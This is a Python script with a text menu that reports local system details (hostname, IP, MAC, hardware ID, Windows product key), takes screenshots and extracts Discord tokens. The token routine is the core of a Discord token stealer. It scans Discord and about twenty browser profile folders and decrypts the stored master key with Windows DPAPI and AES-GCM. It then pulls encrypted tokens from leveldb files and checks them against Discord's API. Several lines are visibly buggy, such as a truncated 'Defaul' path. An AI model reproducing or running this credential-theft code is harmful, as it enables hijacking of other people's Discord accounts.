import os
import requests
import socket
import psutil
from PIL import ImageGrab
from subprocess import Popen, PIPE
from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import listdir
from json import loads
from re import findall
from pythonping import ping

path = os.path.dirname(os.path.abspath(__file__))
txt = os.path.join(path, "filename.txt")

tokens = []
cleaned = []
checker = []

while True:
    try:
        user = int(input("Select what info to retrieve:\n[1] Machine Name\n[2] Ping\n[3] IP Address\n[4] MAC Address\n[5] HWID\n[6] Windows License\n[7] Discord Token\n[8] Screenshot\n>> "))
    except:
        print("Invalid input.")
        continue
    
    def machinename():
       hostname = socket.gethostname()
       print(hostname)
    
    def checkping(host):
        ping_result = ping(target=host, count=10, timeout=2)
        print(f"{ping_result.rtt_avg_ms}ms")
        
    def ipaddress():
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        print(ip)
        
    def macaddress():
        for interface in psutil.net_if_addrs():
            if psutil.net_if_addrs()[interface][0].address:
                print(psutil.net_if_addrs()[interface][0].address)
                break
            
    def hwid():
        cmd = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        uuid = (cmd.stdout.read() + cmd.stderr.read()).decode().split("\n")[1]
        print(uuid)
        
    def windowslicense():
        cmd = Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        uuid = (cmd.stdout.read() + cmd.stderr.read()).decode().split("\n")[1]
        print(uuid)
        
    def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Error"

    def token():
        already_check = []
        checker = []
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        chrome = local + "\\Google\\Chrome\\User Data"
        paths = {
            'Discord': roaming + '\\discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Lightcord': roaming + '\\Lightcord',
            'Discord PTB': roaming + '\\discordptb',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
            'Amigo': local + '\\Amigo\\User Data',
            'Torch': local + '\\Torch\\User Data',
            'Kometa': local + '\\Kometa\\User Data',
            'Orbitum': local + '\\Orbitum\\User Data',
            'CentBrowser': local + '\\CentBrowser\\User Data',
            '7Star': local + '\\7Star\\7Star\\User Data',
            'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
            'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
            'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
            'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
            'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Iridium': local + '\\Iridium\\User Data\\Default'
        }
        
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            try:
                with open(path + f"\\Local State", "r") as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except: continue
            for file in listdir(path + f"\\Local Storage\\leveldb\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                                    tokens.append(values)
                    except PermissionError: continue
            for i in tokens:
                if i.endswith("\\"):
                    i.replace("\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                try:
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                except IndexError == "Error": continue
                checker.append(tok)
                for value in checker:
                    if value not in already_check:
                        already_check.append(value)
                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        except: continue
                        if res.status_code == 200:
                            print(tok)
    
    def screenshot():
            try:
                ss = ImageGrab.grab()
                with open(txt, 'r') as f:
                     current = int(f.read())
                new = current + 1
                with open(txt, 'w') as f:
                    f.write(str(new))
                ss.save(f"{path}\\screenshot{current}.png")
            except:
                print("Error.")
            else:
                print("Screenshot saved in local folder.")
            
    if user == 1:
        machinename()
    if user == 2:
        checkping("google.com")
    if user == 3:
        ipaddress()
    if user == 4:
        macaddress()
    if user == 5:
        hwid()
    if user == 6:
        windowslicense()
    if user == 7:
        token()
    if user == 8:
        screenshot()
    if user != 1 and user != 2 and user != 3 and user != 4 and user !=5 and user != 6 and user != 7 and user != 8:
        print("Invalid input.")
        continue